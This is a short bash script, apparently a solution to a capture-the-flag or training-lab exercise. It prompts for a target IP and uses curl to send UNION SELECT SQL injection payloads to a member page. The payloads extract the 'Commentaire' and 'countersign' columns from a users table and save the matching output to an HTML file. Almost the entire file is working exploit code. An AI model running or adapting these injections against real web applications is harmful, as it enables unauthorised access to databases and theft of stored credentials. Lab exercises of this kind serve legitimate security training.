#!/bin/bash

echo input the IP address to inspect:
read ip
# 192.168.56.3

url="http://"$ip"/?page=member"

# response=$(curl -s -G -d "id=1 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users" -d "Submit=Submit" "$url")
response=$(curl -s -G -d "id=1 UNION SELECT users" -d "Submit=Submit" "$url")
echo "${response}"
response=$(curl -s -G -d "id=1 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users" -d "Submit=Submit" "$url" | grep "Decrypt")
echo "${response}" > 1.html
open 1.html
